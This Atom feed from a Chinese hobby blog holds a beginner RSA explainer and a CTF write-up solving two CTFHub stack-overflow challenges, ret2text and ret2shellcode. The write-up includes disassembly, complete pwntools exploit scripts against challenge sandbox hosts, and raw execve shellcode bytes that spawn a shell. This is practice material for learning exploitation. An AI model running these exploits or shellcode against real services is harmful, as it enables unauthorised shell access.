<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p0p1ng&#39;s Blog</title>
  
  <subtitle>此后如竟没有炬火，我便是唯一的光</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://p0p1ng.gitee.io/"/>
  <updated>2020-07-10T13:57:58.431Z</updated>
  <id>http://p0p1ng.gitee.io/</id>
  
  <author>
    <name>p0p1ng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>text</title>
    <link href="http://p0p1ng.gitee.io/2020/07/10/text/"/>
    <id>http://p0p1ng.gitee.io/2020/07/10/text/</id>
    <published>2020-07-10T13:57:21.000Z</published>
    <updated>2020-07-10T13:57:58.431Z</updated>
    
    <content type="html"><![CDATA[<p><img src="../assets/404.jpg" alt="avatar"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;../assets/404.jpg&quot; alt=&quot;avatar&quot;&gt;&lt;/p&gt;
&lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
   
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>RSA学习小结（一）</title>
    <link href="http://p0p1ng.gitee.io/2020/07/09/RSA%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://p0p1ng.gitee.io/2020/07/09/RSA%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-07-09T09:30:14.000Z</published>
    <updated>2020-07-09T11:43:30.470Z</updated>
    
    <content type="html"><![CDATA[<p>这一段在做CTF时经常遇到与RSA加密有关的Crypto题，作为萌新的我一脸懵逼。所以在网上找了一些RSA的相关资料学习了一下。在此做一个简单的总结。</p><a id="more"></a>        <h1 id="RSA介绍">          <a href="#RSA介绍" class="heading-link"><i class="fas fa-link"></i></a>RSA介绍</h1>      <p>RSA加密算法是一种非对称加密算法，于1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。在在公开密钥加密和电子商业中RSA被广泛使用。</p><p>关于对称加密和非对称加密的区别，我会继续学习，争取在下一篇博客对两者做一个介绍和区分。</p>        <h1 id="RSA加密的实现">          <a href="#RSA加密的实现" class="heading-link"><i class="fas fa-link"></i></a>RSA加密的实现</h1>              <h2 id="加密前的准备">          <a href="#加密前的准备" class="heading-link"><i class="fas fa-link"></i></a>加密前的准备</h2>      <p>假设有两个小憨憨分别是Alice和Bob。Alice要向Bod传递信息m，这里的m就是明文。为了保证他们传递的信息能够保密，需要对信息进行加密，这样即使信息被人窃听也无法知道他们传递消息的内容。聪明的Bob就想到了一个加密方法，首先他找到两个足够大的质数p，q（确实任意质数都可以，但是使用足够大的质数能确保信息难以被破解）<br> 然后他计算找出一个n     </p><center><strong>n=p*q</strong></center>       <p></p><p>再计算</p><center><strong>φ(n)=(p-1)*(q-1)</strong></center><br>这里的φ(n)被称作欧拉函数<br>接下来求e，e需要满足 <strong>1&lt;e&lt;φ(n)</strong>，且  <strong>e与φ(n)互质</strong>。<br>这个e(encode)就是公钥，然后Bob再求出私钥d(decode)<br>d满足<strong>e*d除以φ(n)余1</strong>,<br>即 <center><strong>(e*d)modφ(n)=1</strong></center><br>这样Alice和Bob就完成了准备工作，之后的加密通信能够实现了。<p></p>        <h2 id="加密的实现">          <a href="#加密的实现" class="heading-link"><i class="fas fa-link"></i></a>加密的实现</h2>      <p>在通信前，Bob要先将计算好的公钥e和计算好的n传递给Alice，Alice利用</p><center><strong>c=m^e^ mod n</strong></center><br>这样就得到密文c，然后Alice就可以将c传递给Bob，值得注意的是，上述两次信息的传递都不用防备窃听，甚至可以公开传递。<br>Bob拿到密文c后，就可以利用他的私钥进行解密了，解密方法如下：<center><strong>m=c^d^ mod n</strong></center><br>所以Alice和Bob就安全的传递了一次信息。<p></p>        <h1 id="RSA的安全性">          <a href="#RSA的安全性" class="heading-link"><i class="fas fa-link"></i></a>RSA的安全性</h1>      <p>通过上述加密过程我们可以知道，只有密文c，私钥e和n被传递。如果有人窃听到了这三个信息，为了解密他需要求出私钥d，根据d的算法，这个窃听者还要先算出φ(n)。又因为φ(n)=(p-1)*(q-1)，窃听者还需分解n，计算出p和q（窃听者：好麻烦啊，我还是算了吧）<br>在上面p和q的选取时，我也提到了p和q要足够大，是因为p和q太小，n很容易被分解，举个栗子n=21，p和q分别为多少，答案很显而易见。<br>在日常生活中的加密中，n常常是1024位的二进制数，分解起来比较困难（比较困难你个头啊，明明是非常困难）。再加之私钥和公钥定期都会进行更换，就更确保了RSA加密的安全性。</p>        <h1 id="写在最后">          <a href="#写在最后" class="heading-link"><i class="fas fa-link"></i></a>写在最后</h1>      <p>本人也是初学者，如果文章中有错误和不足，请您尽管指出。我会在后续的学习中不断完善。感谢阅读。skr~</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一段在做CTF时经常遇到与RSA加密有关的Crypto题，作为萌新的我一脸懵逼。所以在网上找了一些RSA的相关资料学习了一下。在此做一个简单的总结。&lt;/p&gt;
    
    </summary>
    
    
      <category term="学习总结" scheme="http://p0p1ng.gitee.io/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="RSA" scheme="http://p0p1ng.gitee.io/tags/RSA/"/>
    
      <category term="CRYPTO" scheme="http://p0p1ng.gitee.io/tags/CRYPTO/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub PWN刷题</title>
    <link href="http://p0p1ng.gitee.io/2020/07/09/CTFHub-PWN%E5%88%B7%E9%A2%98/"/>
    <id>http://p0p1ng.gitee.io/2020/07/09/CTFHub-PWN%E5%88%B7%E9%A2%98/</id>
    <published>2020-07-09T09:17:40.000Z</published>
    <updated>2020-07-10T02:05:57.883Z</updated>
    
    <content type="html"><![CDATA[<p>最近在CTFHub的PWN技能树中找了两道题来学习栈溢出——ret2text和ret2shellcode</p><p>这两道题出的还是很基础的，吃透栈溢出的基本概念就可以将题目解出。</p><a id="more"></a>        <h1 id="CTFHub-PWN刷题">          <a href="#CTFHub-PWN刷题" class="heading-link"><i class="fas fa-link"></i></a>CTFHub PWN刷题</h1>              <h2 id="ret2text-writeup">          <a href="#ret2text-writeup" class="heading-link"><i class="fas fa-link"></i></a>ret2text writeup</h2>      <p>先用checsec检查一下文件的保护类型</p><figure class="highlight markdown"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line"><span class="code">    RELRO:    Partial RELRO</span></span><br><span class="line"><span class="code">    Stack:    No canary found</span></span><br><span class="line"><span class="code">    NX:       NX disabled</span></span><br><span class="line"><span class="code">    PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="code">    RWX:      Has RWX segments</span></span><br></pre></td></tr></tbody></table></div></figure><p>可以看出没有采取任何的栈保护</p><p>再用IDA打开文件，看到函数中有system函数，搜素字符串发现secure函数中出现了<code>system("/bin/sh")</code>，再看主函数的伪代码</p><figure class="highlight c"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to CTFHub ret2text.Input someting:"</span>);</span><br><span class="line">  gets(&amp;v4, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"bye"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></div></figure><p>可以看到<code>gets函数</code>存在明显的溢出漏洞，所以利用<code>gets函数</code>，输入足够长的字符串，达到溢出栈的目的。查看变量的位置，为 <code>[rbp-0x70]</code>。由于是64位系统，要覆盖掉ebp，就要+8字节。因此 字符串长度为  <code>0x70 + 8</code></p><p>再用反汇编查看secure函数的代码，确定system(“/bin/sh”)的地址为<code>0x00000000004007b8</code>，即<code>0x4007b8</code></p><figure class="highlight plain"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400777 &lt;+0&gt;:push   rbp</span><br><span class="line">0x0000000000400778 &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">0x000000000040077b &lt;+4&gt;:sub    rsp,0x10</span><br><span class="line">0x000000000040077f &lt;+8&gt;:mov    edi,0x0</span><br><span class="line">0x0000000000400784 &lt;+13&gt;:call   0x400640 &lt;time@plt&gt;</span><br><span class="line">0x0000000000400789 &lt;+18&gt;:mov    edi,eax</span><br><span class="line">0x000000000040078b &lt;+20&gt;:call   0x400630 &lt;srand@plt&gt;</span><br><span class="line">0x0000000000400790 &lt;+25&gt;:call   0x400680 &lt;rand@plt&gt;</span><br><span class="line">0x0000000000400795 &lt;+30&gt;:mov    DWORD PTR [rbp-0x4],eax</span><br><span class="line">0x0000000000400798 &lt;+33&gt;:lea    rax,[rbp-0x8]</span><br><span class="line">0x000000000040079c &lt;+37&gt;:mov    rsi,rax</span><br><span class="line">0x000000000040079f &lt;+40&gt;:lea    rdi,[rip+0x122]        # 0x4008c8</span><br><span class="line">0x00000000004007a6 &lt;+47&gt;:mov    eax,0x0</span><br><span class="line">0x00000000004007ab &lt;+52&gt;:call   0x400670 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">0x00000000004007b0 &lt;+57&gt;:mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">0x00000000004007b3 &lt;+60&gt;:cmp    DWORD PTR [rbp-0x4],eax</span><br><span class="line">0x00000000004007b6 &lt;+63&gt;:jne    0x4007c4 &lt;secure+77&gt;</span><br><span class="line">0x00000000004007b8 &lt;+65&gt;:lea    rdi,[rip+0x10c]       ; "/bin/sh"</span><br><span class="line">0x00000000004007bf &lt;+72&gt;:call   0x400620 &lt;system@plt&gt;</span><br><span class="line">0x00000000004007c4 &lt;+77&gt;:nop</span><br><span class="line">0x00000000004007c5 &lt;+78&gt;:leave  </span><br><span class="line">0x00000000004007c6 &lt;+79&gt;:ret</span><br></pre></td></tr></tbody></table></div></figure><p>得到以上两个值之后就可以写exp了</p><figure class="highlight python"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'challenge-6d9543332f6f24b5.sandbox.ctfhub.com'</span></span><br><span class="line">port = <span class="number">33698</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./pwn")</span></span><br><span class="line">p = connect(host, port)</span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x78</span> + p64(<span class="number">0x4007b8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></div></figure><p>之后就能拿到flag了</p>        <h2 id="ret2shellcode-writeup">          <a href="#ret2shellcode-writeup" class="heading-link"><i class="fas fa-link"></i></a>ret2shellcode writeup</h2>      <p>使用checksec查看一下文件的保护</p><figure class="highlight markdown"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line"><span class="code">    RELRO:    Partial RELRO</span></span><br><span class="line"><span class="code">    Stack:    No canary found</span></span><br><span class="line"><span class="code">    NX:       NX disabled</span></span><br><span class="line"><span class="code">    PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="code">    RWX:      Has RWX segments</span></span><br></pre></td></tr></tbody></table></div></figure><p>依旧没有采取任何的保护，再用IDA打开，查看文件的代码。</p><p>因为函数中不包含system函数，用file查看文件时也显示使用动态链接，然而题中并未提供动态链接库，因此ret2libc的思路是行不通的，也无法使用ROP。因此采用ret2shellcode的功能</p><figure class="highlight c"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">0L</span>L;</span><br><span class="line">  v5 = <span class="number">0L</span>L;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to CTFHub ret2shellcode!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What is it : [%p] ?\n"</span>, &amp;buf, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input someting : "</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></div></figure><p>在伪代码  <code>printf("What is it : [%p] ?\n", &amp;buf, 0LL, 0LL);</code>中可以看到<code>printf函数</code>会把变量<code>buf</code>的地址输出，因此可以直接读取<code>buf</code>的地址。</p><p> <code>__int64 buf; // [rsp+0h] [rbp-10h]</code>可以得出<code>buf</code>对<code>rbp</code>的偏移量为<code>0x10</code>，因此我们需要溢出的空间为<code>16 + 8 = 24</code>，而偏移地址为<code>buf_addr+32</code>(32 = 24 + 8)。</p><p>最后生成shellcode，shellcode可以使用pwntools中函数生成</p><figure class="highlight python"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br></pre></td></tr></tbody></table></div></figure><p>也可以直接使用</p><figure class="highlight bash"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br></pre></td></tr></tbody></table></div></figure><p>两个测试过都可以pwn通，根据喜好选择。</p><p>之后就能构造payload</p><figure class="highlight bash"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'a'</span>*24+[buf_addr+32]+shellcode</span><br></pre></td></tr></tbody></table></div></figure><p>然后编写完整的EXP</p><figure class="highlight python"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">'challenge-73515f640e7d1aa5.sandbox.ctfhub.com'</span></span><br><span class="line">port = <span class="number">36434</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./ret2shellcode')</span></span><br><span class="line">p = connect(host,port)</span><br><span class="line">p.recvuntil(<span class="string">'['</span>)</span><br><span class="line">buf_addr = p.recvuntil(<span class="string">']'</span>, drop=<span class="literal">True</span>) <span class="comment"># 获取buf地址</span></span><br><span class="line"><span class="comment"># print buf_addr</span></span><br><span class="line">p.recvuntil(<span class="string">'Input someting : '</span>) <span class="comment"># 执行直到出现这句话</span></span><br><span class="line">shell=<span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">24</span> + p64(int(buf_addr,<span class="number">16</span>)+<span class="number">32</span>) + shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></div></figure><p>最后得到flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在CTFHub的PWN技能树中找了两道题来学习栈溢出——ret2text和ret2shellcode&lt;/p&gt;
&lt;p&gt;这两道题出的还是很基础的，吃透栈溢出的基本概念就可以将题目解出。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://p0p1ng.gitee.io/categories/CTF/"/>
    
    
      <category term="PWN" scheme="http://p0p1ng.gitee.io/tags/PWN/"/>
    
  </entry>
  
</feed>
